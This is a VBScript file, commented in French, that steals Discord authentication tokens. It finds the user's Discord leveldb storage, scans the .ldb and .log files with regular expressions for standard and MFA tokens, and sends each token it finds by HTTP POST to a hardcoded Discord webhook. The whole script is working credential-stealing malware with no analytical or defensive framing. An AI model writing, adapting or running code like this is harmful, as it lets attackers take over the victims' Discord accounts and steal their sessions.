Dim webhook, fso, discordPath, file, text, tokenPattern, regex, matches, match, http, postData
webhook = "https://discord.com/api/webhooks/1504566316172837029/fhDisuj783W4JP2bskkTI5dhT60Df8aQtkp9oqsLp7-xADYmaF-mvkCKvYaoNzzjbkTs"

Set fso = CreateObject("Scripting.FileSystemObject")
discordPath = fso.GetSpecialFolder(0) & "\..\..\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Roaming\discord\Local Storage\leveldb\"

If fso.FolderExists(discordPath) Then
    For Each file In fso.GetFolder(discordPath).Files
        If LCase(fso.GetExtensionName(file.Name)) = "ldb" Or LCase(fso.GetExtensionName(file.Name)) = "log" Then
            text = fso.OpenTextFile(file.Path, 1).ReadAll
            
            ' Chercher le token standard
            Set regex = New RegExp
            regex.Pattern = """token"":""([^""]+)"""
            regex.IgnoreCase = True
            regex.Global = True
            Set matches = regex.Execute(text)
            
            For Each match In matches
                SendToDiscord "Token: " & match.SubMatches(0)
            Next
            
            ' Chercher le token MFA
            regex.Pattern = "mfa\.[a-zA-Z0-9_-]{80,}"
            Set matches = regex.Execute(text)
            
            For Each match In matches
                SendToDiscord "Token MFA: " & match.Value
            Next
        End If
    Next
End If

Function SendToDiscord(message)
    Set http = CreateObject("MSXML2.XMLHTTP")
    postData = "{""content"":""**" & message & "**""}"
    http.Open "POST", webhook, False
    http.SetRequestHeader "Content-Type", "application/json"
    http.Send postData
End Function